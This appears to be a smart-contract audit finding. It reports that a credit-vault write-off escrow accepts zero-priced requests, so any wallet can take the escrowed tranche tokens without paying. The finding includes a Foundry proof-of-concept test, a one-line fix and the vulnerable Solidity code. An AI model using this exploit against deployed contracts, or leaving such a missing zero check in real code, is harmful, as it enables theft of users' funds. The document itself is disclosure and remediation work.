### Title
Zero-value write-off request allows unrestricted seizure of escrowed tranches - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary

`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that the deposited tranche amount is nonzero, but permits `underlyingsRequested == 0`. [1](#0-0)  Any caller can then fulfill that request with `_underlyings == 0`, receive all escrowed tranche tokens, and pay no underlying asset to the lender. [2](#0-1) 

### Finding Description

The write-off escrow is intended to exchange a lender's escrowed tranche tokens for a nonzero amount of underlying tokens supplied by a fulfiller. During a running epoch, a lender calls `createWriteOffRequest(amount, underlyingsRequested)`, which transfers `amount` tranche tokens into escrow. [3](#0-2) 

The function rejects `amount == 0` but does not reject `underlyingsRequested == 0`. [4](#0-3)  The stored request then represents collateral with a zero-priced ask. [5](#0-4) 

`fullfillWriteOffRequest` is callable by any wallet and only requires the supplied tranche count to match the stored request and `_underlyings` to be greater than or equal to the requested amount. [6](#0-5)  For a zero-priced request, passing zero satisfies that check; the contract deletes the request, transfers zero underlying units, and sends the full escrowed tranche balance to the fulfiller. [7](#0-6) 

This is the credit-vault analog of unsafe processing of zero-length input: a valid nonzero collateral deposit can be paired with an empty consideration leg. The intended asset exchange becomes a one-way transfer of the lender's tranche tokens.

### Impact Explanation

An unprivileged fulfiller can permanently take every tranche token held by a zero-priced write-off request without transferring any underlying asset or requiring approval, role membership, KYC status, or borrower status. The lender loses the full escrowed tranche position and receives zero net underlying because `_totFee` is also zero. [8](#0-7) 

The loss equals the `tranches` amount in the victim request. For example, a request escrowing `10_000e18` AA tranche tokens can be cleared by paying `0` underlying units.

### Likelihood Explanation

Exploitation requires a user to create a request with `underlyingsRequested == 0`; an attacker cannot change an existing request to zero. Once such a request exists, however, fulfillment is permissionless, atomic, costs the attacker no underlying asset, and can be executed immediately before the user can delete the request. [2](#0-1) 

The missing check is especially risky because requests can be submitted through integrations or transactions that leave an optional output field unset. Existing protections do not stop the trade: `nonReentrant` does not validate economics, the nonzero check covers only collateral, and the comparison `_underlyings < currentRequest.underlyings` treats zero as an acceptable payment. [9](#0-8) 

### Recommendation

Reject zero-valued write-off asks during request creation:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Also consider requiring `_underlyings != 0` in `fullfillWriteOffRequest` as defense-in-depth for requests stored before an upgrade. A separate administrative or user-initiated cleanup path may be needed for any legacy zero-priced requests.

### Proof of Concept

The following test can be added to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which already forks mainnet and approves the escrow for `LP`.

```solidity
function testZeroUnderlyingRequestCanBeClaimedForFree() external {
    uint256 requestedTranches = 10_000e18;
    address attacker = makeAddr("zero-price-buyer");

    // The vault must be in a running epoch, as required by createWriteOffRequest.
    assertTrue(cdoEpoch.isEpochRunning(), "test requires a running epoch");

    uint256 sellerTranchesBefore = tranche.balanceOf(LP);

    // A malformed request escrows valuable tranches while asking for zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 storedTranches, uint256 storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, requestedTranches);
    assertEq(storedUnderlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    uint256 attackerTranchesBefore = tranche.balanceOf(attacker);
    uint256 sellerUnderlyingBefore = underlying.balanceOf(LP);

    // Any unprivileged wallet satisfies the zero ask and receives all collateral.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    assertEq(
        tranche.balanceOf(attacker) - attackerTranchesBefore,
        requestedTranches,
        "attacker did not receive escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP),
        sellerUnderlyingBefore,
        "seller received underlying"
    );
    assertEq(
        tranche.balanceOf(LP),
        sellerTranchesBefore - requestedTranches,
        "seller tranche loss mismatch"
    );

    (storedTranches, storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, 0);
    assertEq(storedUnderlyings, 0);
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
